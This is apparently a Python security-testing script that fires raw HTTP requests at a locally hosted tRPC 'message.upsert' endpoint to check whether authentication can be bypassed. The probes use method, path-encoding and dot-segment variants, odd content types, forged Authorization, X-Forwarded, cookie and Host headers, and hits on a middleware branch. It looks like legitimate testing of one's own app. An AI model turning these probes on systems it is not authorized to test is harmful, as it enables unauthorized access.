import socket, json, sys, time

HOST, PORT = '127.0.0.1', 3117
BIT = 32768

# ---- ORACLE, fixed before the attack ----
# auth HELD      : body contains UNAUTHORIZED and nothing shows the resolver ran
# auth BYPASSED  : any sign the resolver executed -- a DB reach attempt
#                  (ECONNREFUSED / P1001 / "Can't reach database"), or a success payload
BYPASS_MARKERS = ["ECONNREFUSED", "P1001", "Can't reach database", "prisma", "PrismaClient", '"result"']
HELD_MARKER = "UNAUTHORIZED"

def raw(method, path, body=None, extra_headers=(), host_hdr=None):
    """Drive bytes onto the socket directly. No client library, no normalisation,
    no percent-encoding repair, no header canonicalisation."""
    s = socket.create_connection((HOST, PORT), timeout=15)
    payload = body.encode() if body else b''
    lines = [f"{method} {path} HTTP/1.1", f"Host: {host_hdr or (HOST + ':' + str(PORT))}"]
    for h in extra_headers:
        lines.append(h)
    if body is not None:
        lines.append(f"Content-Length: {len(payload)}")
    lines.append("Connection: close")
    req = ("\r\n".join(lines) + "\r\n\r\n").encode() + payload
    s.sendall(req)
    buf = b''
    try:
        while True:
            chunk = s.recv(65536)
            if not chunk: break
            buf += chunk
    except Exception:
        pass
    s.close()
    return buf.decode('utf-8', 'replace')

def classify(resp):
    head = resp.split('\r\n')[0] if resp else '(empty)'
    for m in BYPASS_MARKERS:
        if m in resp:
            return 'BYPASSED?', head, m
    if HELD_MARKER in resp:
        return 'HELD', head, HELD_MARKER
    return 'OTHER', head, ''

FIVE712 = json.dumps({"0": {"json": {"message": {
    "name": "cr7-probe", "data": {"flags": BIT, "content": "a body the user typed",
    "embeds": [{"title": "x"}], "components": [{"type": 17, "components": [{"type": 10, "content": "hi"}]}]}}}}})
SIMPLE = json.dumps({"json": {"message": {"name": "cr7-probe",
    "data": {"flags": BIT, "content": "a body the user typed"}}}})

JSON_CT = "Content-Type: application/json"

# ---- the input class, enumerated rather than sampled ----
CASES = []
# methods
for m in ["POST", "GET", "PUT", "PATCH", "DELETE", "OPTIONS", "HEAD", "TRACE", "FOO"]:
    CASES.append((f"method {m}", m, "/api/trpc/message.upsert?batch=1", FIVE712, [JSON_CT], None))
# path encodings / dot segments / separators
for p in [
    "/api/trpc/message.upsert",
    "/api/trpc/message.upsert?batch=1",
    "/api/trpc/message%2Eupsert?batch=1",
    "/api/trpc/message.UPSERT?batch=1",
    "/api/trpc/MESSAGE.UPSERT?batch=1",
    "/api/trpc/Message.Upsert?batch=1",
    "/api/trpc/message.upsert/?batch=1",
    "/api/trpc/message.upsert.?batch=1",
    "//api/trpc/message.upsert?batch=1",
    "/api//trpc/message.upsert?batch=1",
    "/api/./trpc/message.upsert?batch=1",
    "/api/foo/../trpc/message.upsert?batch=1",
    "/api/trpc/../trpc/message.upsert?batch=1",
    "/api/trpc/message.upsert%00?batch=1",
    "/api/trpc/message.upsert%20?batch=1",
    "/api/trpc/message.getOne,message.upsert?batch=1",
    "/api/trpc/message.upsert,message.getOne?batch=1",
    "/%61pi/trpc/message.upsert?batch=1",
    "/api/trpc/message.upsert?batch=1&input=%7B%7D",
]:
    CASES.append((f"path {p}", "POST", p, FIVE712, [JSON_CT], None))
# content types
for ct in ["application/json", "text/plain", "application/x-www-form-urlencoded",
           "application/json; charset=utf-8", "APPLICATION/JSON", ""]:
    hdrs = [f"Content-Type: {ct}"] if ct else []
    CASES.append((f"content-type '{ct}'", "POST", "/api/trpc/message.upsert?batch=1", FIVE712, hdrs, None))
# duplicate / conflicting headers
CASES.append(("dup Content-Type", "POST", "/api/trpc/message.upsert?batch=1", FIVE712,
              [JSON_CT, "Content-Type: text/plain"], None))
CASES.append(("forged auth headers", "POST", "/api/trpc/message.upsert?batch=1", FIVE712,
              [JSON_CT, "Authorization: Bearer x", "X-Forwarded-For: 127.0.0.1",
               "X-Forwarded-Host: localhost", "X-Real-IP: 127.0.0.1"], None))
CASES.append(("forged session cookie", "POST", "/api/trpc/message.upsert?batch=1", FIVE712,
              [JSON_CT, "Cookie: next-auth.session-token=forged; __Secure-next-auth.session-token=forged"], None))
CASES.append(("forged host", "POST", "/api/trpc/message.upsert?batch=1", FIVE712, [JSON_CT], "evil.example"))
CASES.append(("non-batch simple body", "POST", "/api/trpc/message.upsert", SIMPLE, [JSON_CT], None))
# the dead middleware branch, probed directly
for p in ["/api/v1/anything", "/api/v1/*", "/api/v1/*/anything"]:
    CASES.append((f"middleware branch {p}", "GET", p, None, [], None))

results = []
for name, method, path, body, hdrs, host in CASES:
    try:
        resp = raw(method, path, body, hdrs, host)
        verdict, status, marker = classify(resp)
    except Exception as e:
        verdict, status, marker = 'ERROR', str(e), ''
    results.append((name, method, verdict, status, marker))
    print(f"{verdict:10s} | {method:7s} | {name[:52]:52s} | {status[:40]}")

print()
print("=== SUMMARY ===")
from collections import Counter
c = Counter(r[2] for r in results)
for k, v in sorted(c.items()):
    print(f"  {k}: {v}")
print(f"  total cases: {len(results)}")
bypass = [r for r in results if r[2] == 'BYPASSED?']
print(f"  POSSIBLE BYPASSES: {len(bypass)}")
for b in bypass:
    print("   ", b)
